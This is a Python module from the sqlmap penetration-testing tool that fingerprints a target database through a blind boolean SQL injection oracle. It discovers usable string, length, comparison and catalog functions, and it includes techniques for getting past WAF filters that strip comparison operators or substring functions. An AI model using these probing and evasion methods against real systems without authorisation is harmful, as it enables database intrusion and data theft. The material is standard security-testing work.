#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from .atlas import _BANNER_KEYWORDS
from .atlas import _BANNERS
from .atlas import _BINWRAP
from .atlas import _BYTELEN
from .atlas import _CATALOGS
from .atlas import _CHARCODE
from .atlas import _CHARFROM
from .atlas import _charsetCodec
from .atlas import _CHARSET_PROBES
from .atlas import _COALESCE
from .atlas import _CONCAT
from .atlas import _DUAL
from .atlas import _DUAL_IMPLIES
from .atlas import _HEXFN
from .atlas import _IDENTITY
from .atlas import _LENGTH
from .atlas import _PREFIX
from .atlas import _SUBSTRING
from .atlas import _TEXTCAST
from .records import Cap
from .records import OracleUndecided


class _Discovery(object):
    """_Discovery

    probe the target to build the Dialect; populates self.dialect, never extracts data."""

    def discover(self):
        with self._probePhase():
            return self._discover()

    def _discover(self):
        if not self._sanity():
            raise RuntimeError("oracle does not behave (1=1 true / 1=2 false failed)")
        try:
            self._discoverSubstring()
        except RuntimeError:
            # MAX-CONSTRAINT path: every substring fn is blacklisted. fall back to a
            # pure pattern-match extractor (LIKE/GLOB) that needs no SUBSTR/LENGTH/
            # code/hex fn.
            if self._fallbackPrefix():
                return self.dialect
            raise
        try:
            self._discoverLength()
        except RuntimeError:
            # no length fn - derive length from the substring's end behavior, provided
            # that end is observable (empty/NULL). one more laddered capability, so a
            # backend with substring but no CHAR_LENGTH/LENGTH/LEN still extracts.
            # if the end isn't observable (e.g. LEFT/RIGHT), drop to the pattern floor.
            if self.dialect.substring.get("beyond_end") not in ("empty", "null-or-error"):
                if self._fallbackPrefix():
                    return self.dialect
                raise
            self.dialect.notes.append("no length fn; length derived from substring end")
        self._discoverBytelen()
        self._discoverConcat()
        self._fixupLength()
        self._discoverTextcast()
        self._discoverCoalesce()
        self._discoverCompare()
        self._discoverComparator()
        self._discoverCharfrom()
        self._discoverCharset()
        self._discoverDual()
        self._discoverIdentity()
        self._discoverCatalog()
        self._checkCompat()
        self._discovered = True
        return self.dialect

    def _fallbackPrefix(self):
        # pure LIKE/GLOB pattern-match floor: usable when there is no workable
        # substring+length combo (substring absent, or present but unmeasurable).
        # only the pattern-INDEPENDENT capabilities (charfrom/dual/catalog use no
        # SUBSTR) are discovered; concat/compare/etc. stay None.
        if not self._discoverPrefix():
            return False
        self.dialect.substring = None       # route retrieval to the pattern-match path
        self.dialect.length = None
        self.dialect.compare = "like"
        # the numeric/paging comparator is STILL needed here: catalog keyset paging relies on
        # it, and the constructor default 'gt'/_inOk=True would silently fail (returning only
        # the first row, no warning) on the very WAF that forced this floor. Discover the real
        # capability so paging uses NOT IN / brute-force honestly.
        self._discoverComparator()
        self._discoverCharfrom()
        self._discoverCharset()
        self._discoverDual()
        self._discoverCatalog()
        self._discovered = True
        return True

    def _discoverPrefix(self):
        # LIKE/GLOB pattern match: 'sqlmap' <op> 'sq<multi>' true, 'zz<multi>' false.
        # also measure case-sensitivity ('a' <op> 'A').
        for op, multi, single in _PREFIX:
            if self._ask("('sqlmap') %s 'sq%s'" % (op, multi)) and \
               not self._ask("('sqlmap') %s 'zz%s'" % (op, multi)):
                ci = self._ask("('a') %s 'A'" % op)
                self.dialect.prefix = Cap(op, "%s", multi=multi, single=single, case_insensitive=ci)
                return op
        return None

    def identify(self):
        """Fuse catalog family + required dual-table + version banner (+ behavioral
        tells) into a best-guess product with an evidence trail. Run after
        discover(). This is the CTF step: name the abomination on the other end."""
        d = self.dialect
        if not self._discovered:
            self.discover()
        ev = []
        if d.catalog:
            ev.append(("catalog = %s" % d.catalog, d.family))
        if d.dual and d.dual[0] != "bare":
            ev.append(("bare SELECT needs FROM %s" % d.dual[0], _DUAL_IMPLIES.get(d.dual[0], "?")))
        product = None
        # best-effort naming: on a permission/charset wall a probe may be undecided;
        # degrade to whatever evidence was gathered rather than crash the verdict
        try:
            # cheap behavioral tell: || is logical OR -> MySQL family (one probe, no banner)
            if d.concat and d.concat[0] != "pipes" and self._ask("(%s)=1" % _CONCAT[0][1].format(a="1", b="1")):
                ev.append(("|| is logical OR (not concat)", "MySQL family"))
                product = "MySQL"
            # the version banner is the EXPENSIVE part (blind-reading a long string), so
            # it is paid for ONLY when the catalog family can't name the product on its
            # own - i.e. the shared INFORMATION_SCHEMA / unknown-catalog case. A specific
            # catalog (SQLite/Oracle/PostgreSQL/MSSQL/...) names the product for free, and
            # --banner reads the full version explicitly via banner().
            if product is None and (not d.family or "ANSI" in d.family):
                val, implied = self._probeBanner()
                if val:
                    ev.append(("banner", val))
                    product = self._nameFromBanner(val) or implied
                if product is None and self._hasChars("@@version_comment"):
                    comment = self.extract("@@version_comment", limit=64)
                    if comment:
                        ev.append(("@@version_comment", comment))
                        product = self._nameFromBanner(comment)
        except OracleUndecided:
            ev.append(("product identification", "stopped (oracle undecided - permission/charset wall)"))

        d.product = product or d.family
        d.evidence = ev
        return {"product": d.product, "version": d.version, "family": d.family,
                "dual": d.dual[0] if d.dual else None, "compare": d.compare,
                "evidence": ev}

    def _probeBanner(self):
        # blind-read the version string (expensive - a long string over the oracle).
        # caches on the dialect; returns (version, implied_product) - some exprs imply a
        # product just by existing (e.g. H2VERSION() -> H2)
        for _label, expr, prod, implies in _BANNERS:
            if self._hasChars(expr):
                val = self.extract(expr, limit=96)
                if val:
                    self.dialect.version = val
                    return val, (prod if implies else None)
        return None, None

    def banner(self):
        """The --banner action: the full version string, read on demand ONLY. The
        fingerprint never triggers this - naming the product (identify) is cheap and
        does not need the banner unless the catalog family is ambiguous."""
        if not self._discovered:
            self.discover()
        if self.dialect.version is None:
            try:
                self._probeBanner()
            except OracleUndecided:
                pass
        return self.dialect.version

    @staticmethod
    def _nameFromBanner(text):
        low = text.lower()
        for kw in _BANNER_KEYWORDS:
            if kw.lower() in low:
                return kw
        return None

    def _discoverSubstring(self):
        for name, tmpl in _SUBSTRING:
            g = lambda e, p, ln: tmpl.format(expr=e, pos=p, len=ln)
            base = None
            if self._ask("%s='q'" % g("'sqlmap'", 2, 1)) and not self._ask("%s='z'" % g("'sqlmap'", 2, 1)):
                base = 1
            elif self._ask("%s='q'" % g("'sqlmap'", 1, 1)) and self._ask("%s='s'" % g("'sqlmap'", 0, 1)):
                base = 0
            if base is None:
                continue
            self.dialect.substring = Cap(name, tmpl, index_base=base)
            # base detection above CONFIRMS the substring fn works; the property
            # measurements below are best-effort and MUST NOT discard it - a probe the
            # oracle can't decide leaves the property at a safe default, never aborts.
            props = self.dialect.substring.props
            try:
                props["beyond_end"] = self._edgeBehavior(self._sub("'ABCDE'", 6, 1))
                props["zero_length"] = self._edgeBehavior(self._sub("'ABCDE'", 1, 0))
                props["unit"] = self._substringUnit()
            except OracleUndecided:
                pass
            props.setdefault("beyond_end", "unknown")
            props.setdefault("zero_length", "unknown")
            props.setdefault("unit", "unknown")
            return name
        self.dialect.substring = None
        raise RuntimeError("no working substring function found")

    def _codeCharTmpl(self):
        # a code->char template (CHAR/CHR/NCHAR), probed ASCII-only and cached. lets
        # the unicode PROPERTY probes build a multibyte test char server-side instead
        # of pushing a raw non-ASCII byte through the URL/app/DBMS encoding layers.
        if self._codeTmpl is None:
            self._codeTmpl = False
            # PASS 1 prefers a UNICODE-capable constructor (one that yields a non-NULL char for a
            # code point > 255), so SQL Server picks NCHAR over the byte-only CHAR - CHAR(8364)
            # is NULL there and would break the euro/UTF-16 probes. PASS 2 accepts any ASCII-
            # working constructor when no Unicode-capable one exists.
            for unicode_capable in (True, False):
                for _, tmpl in _CHARFROM:
                    if not (self._ask("%s='a'" % tmpl.format(code=97)) and
                            not self._ask("%s='b'" % tmpl.format(code=97))):
                        continue
                    if unicode_capable and not self._ask("(%s) IS NOT NULL" % tmpl.format(code=256)):
                        continue
                    self._codeTmpl = tmpl
                    break
                if self._codeTmpl:
                    break
        return self._codeTmpl or None

    def _substringUnit(self):
        # char vs byte, ASCII-only + self-referential: SUBSTR(<mb>,1,1) returns the
        # whole char (== <mb>) if char-based, or a partial byte (!= <mb>) if byte-based.
        # <mb> is a multibyte codepoint built from its numeric code (no raw bytes sent).
        cf = self._codeCharTmpl()
        if not cf:
            return "unknown"
        mb = cf.format(code=0x20AC)                     # U+20AC (multibyte in UTF-8)
        if self._ask("%s=%s" % (self._sub(mb, 1, 1), mb)):
            return "characters"
        return "bytes-or-unknown"

    def _edgeBehavior(self, expr):
        if self._ask("%s=''" % expr):
            return "empty"
        if not self._ask("%s IS NOT NULL" % expr):
            return "null-or-error"
        return "other"

    def _discoverLength(self):
        # prefer a CHARACTER-count fn (pass 1); fall back to any working fn (pass 2)
        # so length stays in the same unit as the char-indexed substring
        for prefer_chars in (True, False):
            for name, tmpl in _LENGTH:
                f = lambda s: tmpl.format(expr=s)
                if not (self._ask("%s=1" % f("'A'")) and self._ask("%s=2" % f("'AB'"))):
                    continue
                try:
                    unit = self._lengthUnit(f)
                except OracleUndecided:
                    unit = "unknown"
                if prefer_chars and unit != "characters":
                    continue
                trailing = self._ask("%s=2" % f("'A '"))       # preserves trailing space?
                empty_null = not self._ask("(%s) IS NOT NULL" % f("''"))  # LENGTH('') errors/NULL?
                self.dialect.length = Cap(name, tmpl, unit=unit, trailing=trailing,
                                          empty_is_null=empty_null)
                return name
        self.dialect.length = None
        raise RuntimeError("no working length function found")

    def _lengthUnit(self, f):
        # ASCII-only: measure the length of a multibyte char built from its code.
        # 1 => character-counting, >=2 => byte-counting. no raw non-ASCII on the wire.
        cf = self._codeCharTmpl()
        if not cf:
            return "unknown"
        mb = cf.format(code=0x20AC)
        if self._ask("%s=1" % f(mb)):
            return "characters"
        if self._ask("%s>=2" % f(mb)):
            return "bytes"
        return "unknown"

    def _fixupLength(self):
        # a length fn that trims trailing spaces (SQL Server/Sybase LEN) truncates
        # any value ending in spaces; rebuild it as LEN(x||'.')-1 with the concat.
        L = self.dialect.length
        if not L or L.get("trailing"):
            return
        if self.dialect.concat:
            joined = self.dialect.concat[1].format(a="({expr})", b="'.'")
            props = dict(L.props, trailing=True)
            inner = "(%s)-1" % L[1].format(expr=joined)
            # a variadic CONCAT() (SQL Server/Sybase) treats NULL as '' -> LEN(CONCAT(NULL,'.'))-1
            # is 0, which would report a NULL value as an empty string. Guard so a NULL input
            # still yields NULL (keeps is_null detectable); harmless for NULL-preserving '||'.
            tmpl = "(CASE WHEN ({expr}) IS NULL THEN NULL ELSE %s END)" % inner
            self.dialect.length = Cap(L.name + "+dot", tmpl, **props)
            self.dialect.notes.append("length fn trims trailing spaces; using %s(x||'.')-1" % L.name)
        else:
            self.dialect.notes.append("length fn trims trailing spaces and no concat to correct it")

    def _checkCompat(self):
        # substring positions and the length count must be in the SAME unit, else
        # the per-position walk desyncs on multibyte data
        s, ln = self.dialect.substring, self.dialect.length
        if s and ln and s.get("unit") == "characters" and ln.get("unit") == "bytes":
            # HARD strategy change (not just a warning): a byte-count length would drive the
            # char-indexed substring walk PAST the end of a multibyte value. Discard it so
            # length is derived from the char-based substring instead - same unit, no desync.
            self.dialect.notes.append("unit mismatch (char substring vs byte-count length) - deriving length from substring")
            self.dialect.length = None

    def _discoverBytelen(self):
        # a *byte*-length fn - distinguished from char length with a multibyte char
        # (a char-length fn would report 1). the char is built from its code (ASCII on
        # the wire); if it can't be built, the atlas name is trusted on the ASCII check.
        cf = self._codeCharTmpl()
        mb = cf.format(code=0x20AC) if cf else None
        for name, tmpl in _BYTELEN:
            try:
                if not self._ask("%s=2" % tmpl.format(expr="'AB'")):
                    continue
                if mb and not self._ask("%s>=2" % tmpl.format(expr=mb)):
                    continue                            # counts chars, not bytes
            except OracleUndecided:
                continue
            self.dialect.bytelen = Cap(name, tmpl)
            return name

    # casts with no length bound - hex-framing a value through these can never truncate it;
    # anything else may silently shorten a long value, so dump() verifies those cells at source
    _UNBOUNDED_CASTS = frozenset(("cast_text", "cast_char", "cast_nvarchar_max",
                                  "cast_varchar_max", "cast_string"))

    def _discoverTextcast(self):
        # a cast that stringifies a number: substr(cast(123),1,1)='1' and the
        # negative sign survives (substr(cast(-42),1,1)='-')
        for name, tmpl in _TEXTCAST:
            c123, cneg = tmpl.format(expr="123"), tmpl.format(expr="-42")
            if self._ask("%s='1'" % self._sub(c123, 1, 1)) and \
               self._lenEquals(c123, 3) and \
               self._ask("%s='-'" % self._sub(cneg, 1, 1)):
                self.dialect.textcast = Cap(name, tmpl, bounded=name not in self._UNBOUNDED_CASTS)
                return name

    def _discoverCoalesce(self):
        # COALESCE(NULL,'X') -> 'X'. whether empty stays empty is a *measured*
        # property, not a requirement (on Oracle '' IS NULL, so it becomes 'X').
        for name, tmpl in _COALESCE:
            g = lambda e, fb: tmpl.format(expr=e, fallback=fb)
            if self._ask("%s='X'" % self._sub(g("NULL", "'X'"), 1, 1)):
                empty_distinct = self._lenEquals(g("''", "'X'"), 0)
                self.dialect.coalesce = Cap(name, tmpl, empty_distinct=empty_distinct)
                return name

    def _discoverDual(self):
        # the tableless-SELECT FROM suffix; a non-bare match is a family fingerprint
        for name, frm in _DUAL:
            if self._ask("(SELECT 1%s)=1" % frm):
                self.dialect.dual = Cap(name, frm)
                return name

    def _discoverConcat(self):
        # test via substring of the joined result to dodge numeric-coercion
        # false positives (MySQL 'a'+'b' -> 0, '||' -> logical OR, etc.)
        for name, tmpl in _CONCAT:
            joined = tmpl.format(a="'sq'", b="'lm'")
            if self._ask("%s='l'" % self._sub(joined, 3, 1)) and \
               self._lenEquals(joined, 4):
                self.dialect.concat = Cap(name, tmpl)
                # function-style concat (CONCAT(a,b)) may be VARIADIC - a flat
                # CONCAT(a,b,c,...) beats deeply nested CONCAT(CONCAT(...)) (smaller
                # payload, less WAF/URL surface). operators (||/+) split() to "".
                func = tmpl.split("(")[0]
                if func:
                    try:
                        three = "%s('s','q','l')" % func
                        if self._ask("%s='q'" % self._sub(three, 2, 1)) and self._lenEquals(three, 3):
                            self.dialect.concat.props["variadic"] = func
                    except OracleUndecided:
                        pass
                return name
        self.dialect.concat = None
        self.dialect.notes.append("no concatenation operator discovered")

    def _discoverCompare(self):
        # 1) numeric code function - fast, unambiguous bisection
        one = self._sub("'sqlmap'", 2, 1)       # -> 'q' (code 113 / 0x71)
        for name, tmpl in _CHARCODE:
            code = tmpl.format(expr=one)
            if self._ask("%s=113" % code) and not self._ask("%s=112" % code):
                self.dialect.charcode = Cap(name, tmpl, semantics=self._charcodeSemantics(tmpl))
                self.dialect.compare = "code"
                self.dialect.ordered = True
                return "code:%s" % name
        self.dialect.charcode = None

        # 2) force byte-ordered comparison via COLLATE / binary cast - as fast as a
        #    code function (one compare per bisection) and recovers case under CI /
        #    locale collations. tried before hex because it's cheaper.
        cf = self._codeCharTmpl()
        for name, tmpl in _BINWRAP:
            w = lambda s: tmpl.format(x=s)
            if not (self._ask("%s>%s" % (w("'a'"), w("'A'"))) and
                    not self._ask("%s>%s" % (w("'A'"), w("'a'"))) and
                    not self._ask("%s=%s" % (w("'a'"), w("'A'")))):
                continue
            # BYTE-EXACT proof, not just case ORDER: a binary wrapper is used to certify EXACT
            # values, so it must also distinguish TRAILING SPACES (most collations are PAD SPACE)
            # and ACCENTS (many collations are accent-insensitive). One that folds either is
            # ordered but NOT byte-exact -> skip it and fall through to hex, rather than promote a
            # folded value (trailing-space or accent folding) to EXACT.
            if self._ask("%s=%s" % (w("'a'"), w("'a '"))):          # trailing-space insensitive
                continue
            # accent test needs a char constructor to build the accented probe. If we HAVE one and
            # it folds -> skip (not byte-exact). If we DON'T (constructors blocked), accents are
            # UNTESTABLE: keep the wrapper for ORDERING (char reads) but mark byte_exact=False, so
            # it does NOT certify EXACT (an accent-insensitive wrapper would silently pass an accented char as its base letter).
            byte_exact = False
            if cf:
                if self._ask("%s=%s" % (w(cf.format(code=0xE9)), w("'e'"))):       # accent insensitive
                    continue
                byte_exact = True
            self.dialect.binwrap = Cap(name, tmpl, byte_exact=byte_exact)
            self.dialect.compare = "collation"
            self.dialect.ordered = True
            if not byte_exact:
                self.dialect.notes.append("binary wrapper accent-sensitivity untestable (no char "
                                          "constructor) - used for ordering, not exactness")
            return "collation:%s" % name

        # 3) hex/byte function - collation-independent, recovers letter case even
        #    under case-insensitive collations (the key fallback when code fns are
        #    filtered by a WAF)
        for name, tmpl in _HEXFN:
            enc = self._hexEncoding(tmpl)
            if enc is not None:                          # '' = usable, codec unknown (auto-detect)
                self.dialect.hexfn = Cap(name, tmpl, encoding=(enc or None))
                self.dialect.compare = "hex"
                self.dialect.ordered = True
                return "hex:%s" % name

        # 4) direct string comparison - only trustworthy where the collation follows
        #    byte order (probe the ASCII case/range invariants first)
        byteOrdered = (self._ask("'a'>'A'") and self._ask("'Z'<'a'") and self._ask("'0'<'A'"))
        if byteOrdered and self._ask("%s>'p'" % one) and not self._ask("%s>'r'" % one):
            self.dialect.compare = "ordinal"
            self.dialect.ordered = True
            return "ordinal"

        # 5) equality scan - case-correct only under a case-sensitive collation
        if not self._ask("'a'='A'"):
            self.dialect.compare = "equality"
            return "equality"

        # 6) last resort: case-insensitive equality. letters recovered, CASE LOST
        #    (no code/hex function and a CI collation - a genuine hard limit)
        self.dialect.compare = "equality-ci"
        self.dialect.notes.append("case-insensitive collation and no code/hex function: letter case is not recoverable")
        return "equality-ci"

    # STRICT-'>' semantic truth table across the signed domain. Two positive samples (2>1,
    # !2>3) are NOT enough: a '>'->'>=' rewrite passes them but fails the equality boundary
    # (2>2 must be FALSE) and would then read every count/length/code off by one. Each
    # candidate must reproduce '>' at the equality boundary AND across zero and negatives.
    _GT_TRUTH = ((2, 1, True), (2, 2, False), (2, 3, False),
                 (0, -1, True), (0, 0, False), (0, 1, False),
                 (-2, -3, True), (-2, -2, False), (-2, -1, False))

    def _provesGt(self, render):
        # render(a, b) -> SQL for "a > b"; the candidate is accepted only if it matches
        # strict '>' on EVERY truth-table row (equality boundary + zero + negative domain).
        try:
            for a, b, want in self._GT_TRUTH:
                if bool(self._ask(render(a, b))) != want:
                    return False
        except OracleUndecided:
            return False
        return True

    def _discoverComparator(self):
        # how to express "value > threshold" for bisection. A WAF that strips '<'/'>'
        # (very common) would otherwise leave code-mode picking '>' and silently
        # failing. Prefer '>'; else BETWEEN (ordered, no angle brackets); else fall
        # to order-free IN() subset bisection which needs only '=' membership.
        HUGE = 1 << 62
        try:
            if self._provesGt(lambda a, b: "%d>%d" % (a, b)):
                self._comparator = "gt"
            elif self._provesGt(lambda a, b: "%d BETWEEN %d AND %d" % (a, b + 1, HUGE)):
                self._comparator = "between"
                self.dialect.notes.append("'>' unusable; bisecting via BETWEEN")
            elif self._discoverOperatorFreeComparator():
                # picked an ordered (log2) comparator that needs NO comparison operator - see below
                pass
            else:
                self._comparator = "membership"
                self.dialect.notes.append("no ordered comparator; using order-free IN() subset bisection")
            self._inOk = self._ask("2 IN (2,3)") and not self._ask("9 IN (2,3)")
        except OracleUndecided:
            pass    # keep the safe defaults (gt / IN-ok)

    def _discoverOperatorFreeComparator(self):
        # Manual-derived ways to express "expr > n" using NO comparison operator (>,<,>=,<=,BETWEEN):
        # each is an ORDERED (log2) test, so efficient bisection survives a WAF that strips the
        # comparison operators. Each must pass the FULL signed truth table (not a 3-point positive
        # probe), so a candidate that can't represent the negative/zero domain (e.g. WIDTH_BUCKET
        # with lo==hi at n=-1) is rejected instead of silently misreading signed values.
        candidates = (
            ("sign",        "SIGN(({expr})-({n}))=1"),                             # SIGN(): every major DBMS
            ("abs",         "ABS(({expr})-({n})-1)=({expr})-({n})-1"),             # ABS(): backup if SIGN is name-filtered
            ("least",       "LEAST(({expr}),({n})+1)=({n})+1"),                    # GREATEST/LEAST family (expr once)
            ("nullif",      "NULLIF(GREATEST(({expr}),({n})),({n})) IS NOT NULL"), # needs NO '=' -> survives '=' filtering
            ("widthbucket", "WIDTH_BUCKET(({expr}),0,({n})+1,1)=2"),               # PostgreSQL / Oracle
            ("interval",    "INTERVAL(({expr}),({n})+1)=1"),                       # MySQL / MariaDB
        )
        for name, tmpl in candidates:
            if self._provesGt(lambda a, b, _t=tmpl: _t.format(expr=a, n=b)):
                self._comparator = name
                self._cmpTemplate = tmpl
                self.dialect.notes.append("'>'/BETWEEN unusable; ordered bisection via %s() (no comparison operator)" % name.upper())
                return True
        return False

    def _charcodeSemantics(self, tmpl):
        # ASCII-only ROUND-TRIP: build a char from its code, then read the code back.
        # code(char(N))==N means extract-then-rebuild is faithful for N. no raw
        # non-ASCII byte ever crosses the URL/app/DBMS encoding layers.
        cf = self._codeCharTmpl()
        if not cf:
            return "unknown"
        code = lambda n: tmpl.format(expr=cf.format(code=n))
        try:
            if not self._ask("%s=233" % code(0x00E9)):       # U+00E9 round-trips (code(charfrom(0xE9))==0xE9)
                return "unknown"
            if not self._ask("%s=8364" % code(0x20AC)):      # U+20AC does NOT (single-byte codepage can't represent it)
                return "codepage"                            # single-byte codepage only
            # a supplementary char proves full codepoint vs a UTF-16 code-unit fn
            # (SQL Server UNICODE() returns the leading surrogate for U+1F642).
            if self._ask("%s=128578" % code(0x1F642)):
                return "codepoint"
            if self._ask("%s=55357" % code(0x1F642)):        # high surrogate
                return "utf16_unit"
            return "bmp_codepoint"                           # verified on BMP only
        except OracleUndecided:
            return "unknown"

    def _discoverCharfrom(self):
        for name, tmpl in _CHARFROM:
            if self._ask("%s='a'" % tmpl.format(code=97)) and \
               not self._ask("%s='b'" % tmpl.format(code=97)):
                self.dialect.charfrom = Cap(name, tmpl)
                return name
        self.dialect.charfrom = None

    def _discoverCharset(self):
        # ASK THE DB ITS DECLARED CHARSET - the strongest possible encoding signal, and one a
        # boolean oracle can read directly (a huge advantage over passive byte-guessing, which
        # can't tell utf-8 e-acute from cp1252 mojibake). The first family probe that resolves gives a
        # name; map it (quirk-aware: MySQL latin1==cp1252) to a Python codec used as the
        # authoritative hex decoder. Unproven -> None -> non-ASCII text stays non-exact.
        with self._probePhase():                    # a wrong-family charset expr errors -> skip
            for expr in _CHARSET_PROBES:
                try:
                    if not self._hasChars(expr):
                        continue
                    res = self.extractResult(expr, limit=64)
                except OracleUndecided:
                    continue
                if res.value and res.exact:
                    codec = _charsetCodec(res.value)
                    if codec:
                        self.dialect.charset = codec
                        self.dialect.notes.append("declared charset %r -> %s" % (res.value, codec))
                        return codec
        return None

    def _discoverIdentity(self):
        for kind, candidates in sorted(_IDENTITY.items()):
            for expr in candidates:
                # a valid identity expression has non-zero length; invalid -> error -> false
                if self._hasChars(expr):
                    self.dialect.identity[kind] = expr
                    break

    def _discoverCatalog(self):
        for table, family, enum in _CATALOGS:
            if self._exists(table):
                self.dialect.catalog = table
                self.dialect.family = family
                self.dialect.catalogEnum = enum
                return table
